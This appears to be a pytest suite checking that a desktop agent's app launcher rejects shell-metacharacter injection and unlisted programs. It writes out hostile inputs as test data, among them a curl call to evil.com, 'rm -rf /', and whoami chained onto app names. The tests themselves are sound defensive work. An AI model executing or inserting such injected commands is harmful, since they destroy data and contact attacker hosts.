"""RCE#2 rejection tests — metachar injection and unlisted apps must be denied."""
import pytest
from src.computer_use.desktop_agent import DesktopAgent, ALLOWED_APPS


@pytest.fixture
def agent():
    return DesktopAgent(dry_run=True)


def test_metachar_ampersand_rejected(agent):
    """'notepad.exe & curl http://evil.com' is not in ALLOWED_APPS — rejected."""
    result = agent.open_app("notepad.exe & curl http://evil.com")
    assert result.success is False
    assert "app_not_allowed" in result.error


def test_metachar_semicolon_rejected(agent):
    """'calc.exe; rm -rf /' is not in ALLOWED_APPS — rejected."""
    result = agent.open_app("calc.exe; rm -rf /")
    assert result.success is False
    assert "app_not_allowed" in result.error


def test_shell_pipe_rejected(agent):
    """'notepad.exe | whoami' is not in ALLOWED_APPS — rejected."""
    result = agent.open_app("notepad.exe | whoami")
    assert result.success is False
    assert "app_not_allowed" in result.error


def test_arbitrary_command_rejected(agent):
    """Arbitrary command string is not in ALLOWED_APPS — rejected."""
    result = agent.open_app("cmd.exe /c whoami")
    assert result.success is False
    assert "app_not_allowed" in result.error


def test_empty_name_rejected(agent):
    """Empty string is not in ALLOWED_APPS — rejected."""
    result = agent.open_app("")
    assert result.success is False
    assert "app_not_allowed" in result.error


def test_allowed_app_still_works(agent):
    """notepad.exe (exact) is in ALLOWED_APPS — succeeds in dry_run."""
    result = agent.open_app("notepad.exe")
    assert result.success is True


def test_allowed_app_calc_works(agent):
    """calc.exe (exact) is in ALLOWED_APPS — succeeds in dry_run."""
    result = agent.open_app("calc.exe")
    assert result.success is True


def test_rejected_app_not_in_action_log(agent):
    """Rejected app must not appear in the action log."""
    agent.open_app("evil.exe")
    assert not any(a.target == "evil.exe" for a in agent.action_log)


def test_allowed_apps_frozenset():
    """ALLOWED_APPS must be a frozenset and include the test apps."""
    assert isinstance(ALLOWED_APPS, frozenset)
    assert "notepad.exe" in ALLOWED_APPS
    assert "calc.exe" in ALLOWED_APPS
